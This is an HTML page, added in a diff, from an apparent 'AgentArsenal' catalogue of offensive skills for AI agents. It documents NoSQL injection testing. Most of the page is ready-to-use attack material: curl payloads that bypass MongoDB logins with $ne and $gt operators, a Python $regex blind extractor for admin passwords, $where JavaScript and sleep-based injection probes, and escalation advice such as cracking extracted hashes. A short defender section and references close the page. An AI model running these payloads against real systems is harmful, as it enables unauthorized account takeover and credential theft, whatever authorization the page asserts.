@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: nosql-injection</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>nosql-injection</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing NoSQL-backed applications (MongoDB, CouchDB,</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a> <a href="api-security-testing.html">api-security-testing</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>NoSQL injection works like SQL injection one level up: instead of breaking out of a query string, the attacker injects query operators or JavaScript into the structured query the application builds from user input. A login form that passes <code>{&quot;user&quot;: input}</code> straight into a MongoDB <code>find()</code> can be beaten with <code>{&quot;user&quot;: {&quot;$ne&quot;: null}}</code>, no quotes or comments required. This skill covers the authorized methodology: fingerprinting the backend, operator injection, authentication bypass, blind extraction, and JavaScript injection through <code>$where</code>. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Fingerprint the backend: error messages, response timing, technology</li>
+<p>headers, and how the app parses JSON bodies.</p>
+<li>Test whether JSON values accept objects: replace a string value with</li>
+<p><code>{&quot;$ne&quot;: null}</code> and watch the behavior change.</p>
+<li>Attempt authentication bypass on login forms with <code>$ne</code>, <code>$gt</code>, and</li>
+<p><code>$regex</code> operators.</p>
+<li>Test query string and form parameters too, not just JSON bodies.</li>
+<li>Extract data blind with <code>$regex</code> character-by-character when output</li>
+<p>is not visible.</p>
+<li>Probe <code>$where</code> for server-side JavaScript injection and escalate to</li>
+<p>time-based extraction.</p>
+<li>Automate confirmed primitives with Python, keeping request rates low.</li>
+<li>Record every payload, the exact response difference, and extracted</li>
+<p>values for the report.</p>
+</ol>
+<h2>1. Fingerprinting the NoSQL backend</h2>
+<p>Confirm the backend before choosing payloads. MongoDB, CouchDB, and Redis each respond differently to malformed input.</p>
+<pre><code class="language-bash"># Send a broken JSON body and read the error (MongoDB leaks operator names)
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;: {&quot;$bad&quot;: 1}, &quot;pass&quot;: &quot;x&quot;}&#x27; | head -c 400</code></pre>
+<pre><code class="language-bash"># Type juggling probe: array where a string is expected
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;: [&quot;admin&quot;], &quot;pass&quot;: &quot;x&quot;}&#x27; | head -c 400</code></pre>
+<pre><code class="language-bash"># Check response headers and cookies for backend hints
+curl -si &#x27;https://target.example/api/login&#x27; -X POST \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;:&quot;x&quot;,&quot;pass&quot;:&quot;x&quot;}&#x27; | grep -iE &#x27;^(x-powered-by|server):&#x27;</code></pre>
+<p>Useful signals: MongoDB error text mentioning <code>$where</code> or <code>BadValue</code>, CouchDB&#x27;s distinctive JSON error envelopes, timing differences when operators are evaluated, and a 500 on objects-versus-strings where the app passes input straight to the driver.</p>
+<h2>2. Operator injection in JSON bodies</h2>
+<p>If the application builds its query from the parsed JSON without validating types, operators become injectable values.</p>
+<pre><code class="language-bash"># Authentication bypass: match any user whose name is not null
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;: {&quot;$ne&quot;: null}, &quot;pass&quot;: {&quot;$ne&quot;: null}}&#x27; | head -c 400</code></pre>
+<pre><code class="language-bash"># Target a specific account without knowing its password
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;: &quot;admin&quot;, &quot;pass&quot;: {&quot;$ne&quot;: &quot;wrong&quot;}}&#x27; | head -c 400</code></pre>
+<pre><code class="language-bash"># $gt variant: match any password greater than empty string
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;: &quot;admin&quot;, &quot;pass&quot;: {&quot;$gt&quot;: &quot;&quot;}}&#x27; | head -c 400</code></pre>
+<p>A successful bypass returns the logged-in response (a session cookie, a token, or a redirect to the dashboard). Save the full response and confirm the session actually works by requesting a protected page with it. If the app stringifies input before querying, operators arrive as the literal string <code>{&quot;$ne&quot;: null}</code> and nothing happens; that negative result is still worth one line in the report.</p>
+<h2>3. Operator injection in query strings and forms</h2>
+<p>Some frameworks parse <code>?user[$ne]=</code> into nested objects, which brings operator injection to GET parameters and form bodies.</p>
+<pre><code class="language-bash"># PHP-style nested parameter (Laravel, Express with qs parser)
+curl -s &#x27;https://target.example/api/users?user[$ne]=x&#x27; \
+  -b &#x27;session=YOUR_TEST_SESSION&#x27; | head -c 300
+
+# Login via query string operators
+curl -s &#x27;https://target.example/api/login?user=admin&amp;pass[$ne]=x&#x27; \
+  | head -c 300</code></pre>
+<pre><code class="language-bash"># Form-encoded nested operators
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -d &#x27;user=admin&amp;pass[$gt]=&#x27; | head -c 300</code></pre>
+<p>Test every input vector the app accepts: JSON, form-encoded, and query strings often feed the same query builder through different parsers, and only one of them may preserve the operator structure.</p>
+<h2>4. Boolean blind extraction with $regex</h2>
+<p>When login fails but the response differs between &quot;user exists, wrong password&quot; and &quot;user does not exist&quot;, extract data character by character with <code>$regex</code>.</p>
+<pre><code class="language-bash"># Does the admin password start with &#x27;a&#x27;? (true page vs false page differ)
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;: &quot;admin&quot;, &quot;pass&quot;: {&quot;$regex&quot;: &quot;^a&quot;}}&#x27; | grep -c &#x27;invalid password&#x27;</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;$regex blind extractor for MongoDB-backed logins (authorized only).&quot;&quot;&quot;
+import urllib.request, json, string
+
+URL = &quot;https://target.example/api/login&quot;
+FALSE_MARKER = b&quot;user not found&quot;  # adjust to the app&#x27;s false response
+
+def ask(payload):
+    body = json.dumps({&quot;user&quot;: &quot;admin&quot;, &quot;pass&quot;: payload}).encode()
+    req = urllib.request.Request(URL, data=body,
+                                 headers={&quot;Content-Type&quot;: &quot;application/json&quot;})
+    with urllib.request.urlopen(req, timeout=15) as r:
+        return FALSE_MARKER not in r.read()
+
+known = &quot;&quot;
+alphabet = string.ascii_lowercase + string.digits + &quot;_-!@#&quot;
+while len(known) &lt; 40:
+    found = False
+    for c in alphabet:
+        if ask({&quot;$regex&quot;: f&quot;^{known}{c}&quot;}):
+            known += c
+            found = True
+            print(f&quot;[*] so far: {known}&quot;)
+            break
+    if not found:
+        break
+print(f&quot;[+] extracted: {known}&quot;)</code></pre>
+<p>Anchor every regex with <code>^</code> and build on the known prefix so each request tests exactly one new character. Add a small delay between requests to stay polite.</p>
+<h2>5. JavaScript injection through $where</h2>
+<p>MongoDB&#x27;s <code>$where</code> evaluates JavaScript on the server. If user input reaches it, you get server-side code execution in the database context.</p>
+<pre><code class="language-bash"># Probe: does $where evaluate? (true for every document)
+curl -s -X POST &#x27;https://target.example/api/search&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -b &#x27;session=YOUR_TEST_SESSION&#x27; \
+  -d &#x27;{&quot;q&quot;: {&quot;$where&quot;: &quot;return true&quot;}}&#x27; | head -c 300</code></pre>
+<pre><code class="language-bash"># String breakout: the app wraps input in quotes, break out of them
+# Application builds: { $where: &quot;this.name == &#x27;&lt;INPUT&gt;&#x27;&quot; }
+# Inject: &#x27; || &#x27;1&#x27;==&#x27;1  to make the condition always true
+curl -s -X POST &#x27;https://target.example/api/search&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -b &#x27;session=YOUR_TEST_SESSION&#x27; \
+  -d &#x27;{&quot;q&quot;: &quot;&#x27;&quot;&#x27;&quot;&#x27; || &#x27;&quot;&#x27;&quot;&#x27;1&#x27;&quot;&#x27;&quot;&#x27;==&#x27;&quot;&#x27;&quot;&#x27;1&quot;}&#x27; | head -c 300</code></pre>
+<pre><code class="language-bash"># Time-based confirmation: sleep 3 seconds inside $where
+curl -s -X POST &#x27;https://target.example/api/search&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -b &#x27;session=YOUR_TEST_SESSION&#x27; \
+  -d &#x27;{&quot;q&quot;: {&quot;$where&quot;: &quot;sleep(3000) || true&quot;}}&#x27; -w &#x27;\n%{time_total}s\n&#x27; \
+  -o /dev/null</code></pre>
+<p>A 3-second response against a normally instant endpoint confirms JavaScript execution. From there, blind extraction uses conditional sleep exactly like time-based SQL injection. Keep sleeps short and stop at proof of execution: dumping the whole database through <code>$where</code> is slow and noisy.</p>
+<h2>6. Extracting with error and timing channels</h2>
+<p>When <code>$regex</code> blind is too slow, look for louder channels:</p>
+<ul>
+<li>Error messages: some drivers echo the failing operator or the</li>
+<p>document that failed a cast. Feed <code>$where</code> type errors and read the response.</p>
+<li>Timing: <code>$where</code> with <code>sleep()</code> gated on a condition extracts one</li>
+<p>bit per request, same loop as section 4 but measuring seconds.</p>
+<li>Response size: <code>$regex</code> matches that return more documents produce</li>
+<p>measurably larger responses; binary-search on result count.</p>
+</ul>
+<pre><code class="language-bash"># Error channel probe: force a cast error that echoes data
+curl -s -X POST &#x27;https://target.example/api/search&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -b &#x27;session=YOUR_TEST_SESSION&#x27; \
+  -d &#x27;{&quot;q&quot;: {&quot;$where&quot;: &quot;this.password.length&quot;}}&#x27; | head -c 300</code></pre>
+<p>Document which channel worked and its request cost, because the report needs to justify the extraction method.</p>
+<h2>7. Other NoSQL backends</h2>
+<p>MongoDB is the most common target, but adjust payloads when the fingerprint points elsewhere:</p>
+<ul>
+<li>CouchDB (HTTP API, MapReduce): inject into view keys and Mango</li>
+<p>selectors. Mango uses the same <code>$ne</code>, <code>$gt</code>, <code>$regex</code> operator syntax as MongoDB, so sections 2 to 4 transfer directly.</p>
+<li>Redis: no query language, but command injection where user input</li>
+<p>reaches <code>EVAL</code> or key names. Test keyspace traversal with <code>*</code> and <code>?</code> glob patterns in search features.</p>
+<li>Cassandra/Scylla (CQL): closer to SQL; quote-breaking payloads from</li>
+<p>classic injection apply, minus stacked queries.</p>
+</ul>
+<p>Always re-fingerprint after a backend change; operator syntax that is inert on one database is executable on another.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The app validates with a schema (Joi, Mongoose strict mode):</li>
+<p>operators may be stripped before the query. Test whether nested objects survive validation at all before investing in extraction.</p>
+<li>Input is stringified with <code>JSON.stringify</code> into a string field:</li>
+<p>operators become literal text, not injectable. Move on quickly.</p>
+<li>The driver version blocks <code>$where</code> (disabled by default in modern</li>
+<p>MongoDB configurations): sections 2 to 4 still apply.</p>
+<li>Rate limiting or account lockout on login: blind extraction through</li>
+<p>the login form can lock the test account. Prefer search or profile endpoints for extraction, or coordinate lockout resets.</p>
+<li>The false marker is unreliable (same page for both outcomes):</li>
+<p>switch to the timing channel in section 5 instead of boolean content differences.</p>
+<li>GraphQL resolvers building NoSQL queries: operators hide inside</li>
+<p>GraphQL arguments, so test the resolver inputs, not just REST.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li><code>$ne</code> bypass fails because the app checks the password hash in code:</li>
+<p>pivot to <code>$regex</code> extraction of the hash through a search endpoint, then crack it offline if the rules allow.</p>
+<li>Blind extraction is too slow: look for an error channel (section</li>
+<p>6) or a <code>$where</code> timing primitive to speed up bit recovery.</p>
+<li><code>$where</code> is disabled: test aggregation pipeline injection</li>
+<p>(<code>$lookup</code>, <code>$group</code> stages built from input) on endpoints that expose aggregation.</p>
+<li>Operators are stripped from JSON: try query string nesting</li>
+<p>(section 3) and HTTP parameter pollution, which may take a different parsing path to the same query builder.</p>
+<li>Authentication bypass works but sessions are short-lived: chain</li>
+<p>immediately into password extraction via <code>$regex</code> so the finding stands on its own evidence.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see NoSQL injection as <code>$ne</code>, <code>$gt</code>, <code>$regex</code>, <code>$where</code>, and <code>sleep(</code> strings inside JSON request bodies and query parameters in application logs, bursts of login attempts with object-valued fields, and database profiler entries showing operator-heavy queries from the application user. The durable fixes are schema validation that rejects unexpected types (strings must be strings, never objects), an allowlist of permitted query operators, disabling server-side JavaScript (<code>$where</code>, <code>mapReduce</code>) unless strictly needed, least-privilege database roles for the application, and parameterized query builders instead of passing raw input to <code>find()</code>. A WAF can block known operator strings, but type validation at the application layer is the real fix.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the entry</li>
+<p>point class.</p>
+<li>CWE-943 (Improper Neutralization of Special Elements in Data Query</li>
+<p>Logic): the NoSQL injection weakness.</p>
+<li>CWE-20 (Improper Input Validation): the root cause class.</li>
+<li>OWASP Testing Guide: Testing for NoSQL Injection.</li>
+<li>MongoDB documentation: query operator reference and disabling</li>
+<p>server-side JavaScript.</p>
+<li>PortSwigger Web Security Academy: NoSQL injection labs.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
